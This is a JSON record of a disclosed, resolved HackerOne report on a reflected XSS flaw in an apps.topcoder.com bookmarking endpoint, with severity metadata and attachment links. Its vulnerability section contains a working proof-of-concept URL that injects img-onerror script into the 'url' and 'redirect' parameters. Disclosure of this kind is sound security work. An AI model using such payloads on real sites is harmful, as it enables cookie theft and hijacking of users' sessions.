@@ -1,0 +1,142 @@
+{
+  "id": 866829,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjY4Mjk=",
+  "url": "https://hackerone.com/reports/866829",
+  "title": "Reflected XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-05T22:26:20.231Z",
+  "submitted_at": "2020-05-05T22:26:20.231Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "meryem0x",
+    "url": "/meryem0x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/q8pmp3uer62m3i1t769rk6x9trwe/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 43330,
+    "url": "https://hackerone.com/lab45",
+    "handle": "lab45",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/uss17aubpsiag1df5tlp5mriefid/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/uss17aubpsiag1df5tlp5mriefid/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Lab45",
+      "twitter_handle": "",
+      "website": "http://wipro.com/lab45",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-12T13:41:20.958Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-12T08:59:35.651Z",
+  "team_member_agreed_on_going_public_at": "2020-05-12T13:41:20.777Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nHi :) A reflected XSS occurs when creating bookmarks.\n\n## Steps To Reproduce:\n\nA user can create bookmarks on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action. In this url  `redirect` and `url` parameters are vulnerable to XSS.\n\nPoC:\n`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?url=Asd\"><img src=X onerror=alert(document.domain)>&redirect=Asd\"><img src=X onerror=alert(document.cookie)>`\n\n{F816796}\n{F816795}\n\n## Impact\n\nXSS can use to steal cookies or to run arbitrary code on victim's browser.",
+  "weakness": {
+    "id": 61,
+    "name": "Cross-site Scripting (XSS) - Reflected"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 816795,
+      "file_name": "2020-05-06_01-20-55_ekran_g_r_nt_s_.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1g2iDU8KREkXfKNsUMrUsUzh?response-content-disposition=attachment%3B%20filename%3D%222020-05-06_01-20-55_ekran_g_r_nt_s_.png%22%3B%20filename%2A%3DUTF-8%27%272020-05-06_01-20-55_ekran_g_r_nt_s_.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GVNGGV3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T003659Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFc%2F%2Be815b%2F3a4XK5gHNVQduypFAbYUHiBkNDXcsbOS8AiEAmsJrNr8NWpe2agzQ%2F%2Bcg%2BHAhrDDBu%2BZbisV%2BHRjeLgsquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNejpFiblaJptGLDFSqPBVkmR1y4uaHN2wt00AZFXXNzrwZV0YxpaEqQin9PHJ%2FXw%2FYFSSWVbZ5g%2BLdDdL1n4dbqpsMltm%2B8ap9CM%2FlF%2FvifGxOieaWnqaJyAOOgVZLhRQ0HGC65BYiKPEBCJO%2FL3Hb3fLQa6JKZbxZt7sHNZHRZuwBLaxKDME3kyCnfJwRGFBY9sPKojxRC3HaLhXSqra97QOuf5UmsQhM33eNRyw5vsrSFAI8VvqBBR3GBolkLVDN0p6CA3QM2iEALPIkjSjI7N4YAO9dl5ZDTFxT8pNyqQtgYB38D2FHdiwoPmDxeDkhPaVU1ORUGRbDhakgWt4kA6rVE7WOK7v5Zujtz0%2BXly4MujeTABiZGODvjlqkA7hEhyHDXPkE7UrU96HWJPccqBKBBJeZfr%2FsMw3wgkHJWRvqnv3AOZI2jixdJzi2SF0etFaPuOrrJ8%2FtIMZZw%2BVNwDebjH2S6YIqXuMqMOeLpE%2BYwOdKzmroK83SiYmVATZ6%2FElh9ePP8libkTWbCs3Pxy1xC7eSnq%2ByM5n7wbtXSVKnSdlUSl6Srt8sBI%2Fa9l%2BNfQdsl4idpAKTiv5cnh3H6tQvNBRKBoOTB2xpE0EBrbslSE%2BDEDc8HjDxnkMTHYAHi%2FCXsW92rCR1CZjkHQeX9YdY3b9kQs4zlHa%2FQIn7z9P5AbjfX3XLpHyhmu9tadwNH1tgp5WPLqi5%2FToyypZ2NIWsbMZAhIucOCWwIxi9T3lvUV4Rd2pgxiWyGXgUPFkhc7TbyL43RUlWb0Izq81F7P3dvEvH3aOnP%2FezcpmZZbuFi7EcGgd02i9UjkgCoalnzKaJf4orKQjevs29EuVQUtl7ivxeaoAV05jegLlvvRX5GPX8X7I5ypgc56JgwvOjjzAY6sQHg3HQSNMwmY5AZSWemXQAydgrOIb9TzQHQII7t0K23Zs%2BsZjc2aTAhkvf3uHeo5tyJiw1uyVWbTEVOgphBFH8unvPQzv2i1F2ZSXOGv7Sal6fcoPtkPGd9l%2F8uC2EeVUo1xqvfO5hLW4wwzdGO89G6CtiCMpE6kx%2BNPh9x95t%2B3O3AIvFSgCXjGavldHWM6z6vLOIiGeh%2B8iNwVa0mnmubNwFWbTWKKjLhKKav0PkqIAk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f34240ca9167694e2894ceec221b0a9a5f4df6e4d2a24bd1e35da02a875087c6",
+      "file_size": 115388,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 816796,
+      "file_name": "2020-05-06_01-21-28_ekran_g_r_nt_s_.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/me6Ws6K2RkTkvXz1SisKT1CZ?response-content-disposition=attachment%3B%20filename%3D%222020-05-06_01-21-28_ekran_g_r_nt_s_.png%22%3B%20filename%2A%3DUTF-8%27%272020-05-06_01-21-28_ekran_g_r_nt_s_.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GVNGGV3%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T003659Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFc%2F%2Be815b%2F3a4XK5gHNVQduypFAbYUHiBkNDXcsbOS8AiEAmsJrNr8NWpe2agzQ%2F%2Bcg%2BHAhrDDBu%2BZbisV%2BHRjeLgsquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNejpFiblaJptGLDFSqPBVkmR1y4uaHN2wt00AZFXXNzrwZV0YxpaEqQin9PHJ%2FXw%2FYFSSWVbZ5g%2BLdDdL1n4dbqpsMltm%2B8ap9CM%2FlF%2FvifGxOieaWnqaJyAOOgVZLhRQ0HGC65BYiKPEBCJO%2FL3Hb3fLQa6JKZbxZt7sHNZHRZuwBLaxKDME3kyCnfJwRGFBY9sPKojxRC3HaLhXSqra97QOuf5UmsQhM33eNRyw5vsrSFAI8VvqBBR3GBolkLVDN0p6CA3QM2iEALPIkjSjI7N4YAO9dl5ZDTFxT8pNyqQtgYB38D2FHdiwoPmDxeDkhPaVU1ORUGRbDhakgWt4kA6rVE7WOK7v5Zujtz0%2BXly4MujeTABiZGODvjlqkA7hEhyHDXPkE7UrU96HWJPccqBKBBJeZfr%2FsMw3wgkHJWRvqnv3AOZI2jixdJzi2SF0etFaPuOrrJ8%2FtIMZZw%2BVNwDebjH2S6YIqXuMqMOeLpE%2BYwOdKzmroK83SiYmVATZ6%2FElh9ePP8libkTWbCs3Pxy1xC7eSnq%2ByM5n7wbtXSVKnSdlUSl6Srt8sBI%2Fa9l%2BNfQdsl4idpAKTiv5cnh3H6tQvNBRKBoOTB2xpE0EBrbslSE%2BDEDc8HjDxnkMTHYAHi%2FCXsW92rCR1CZjkHQeX9YdY3b9kQs4zlHa%2FQIn7z9P5AbjfX3XLpHyhmu9tadwNH1tgp5WPLqi5%2FToyypZ2NIWsbMZAhIucOCWwIxi9T3lvUV4Rd2pgxiWyGXgUPFkhc7TbyL43RUlWb0Izq81F7P3dvEvH3aOnP%2FezcpmZZbuFi7EcGgd02i9UjkgCoalnzKaJf4orKQjevs29EuVQUtl7ivxeaoAV05jegLlvvRX5GPX8X7I5ypgc56JgwvOjjzAY6sQHg3HQSNMwmY5AZSWemXQAydgrOIb9TzQHQII7t0K23Zs%2BsZjc2aTAhkvf3uHeo5tyJiw1uyVWbTEVOgphBFH8unvPQzv2i1F2ZSXOGv7Sal6fcoPtkPGd9l%2F8uC2EeVUo1xqvfO5hLW4wwzdGO89G6CtiCMpE6kx%2BNPh9x95t%2B3O3AIvFSgCXjGavldHWM6z6vLOIiGeh%2B8iNwVa0mnmubNwFWbTWKKjLhKKav0PkqIAk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb8c3b2c96096875beb47c35d896988d7f9d17e82dd6b39a5a094ed20f796d95",
+      "file_size": 127462,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "xsky",
+    "mik317",
+    "sa1tama0"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 37578,
+    "asset_type": "URL",
+    "asset_identifier": "apps.topcoder.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
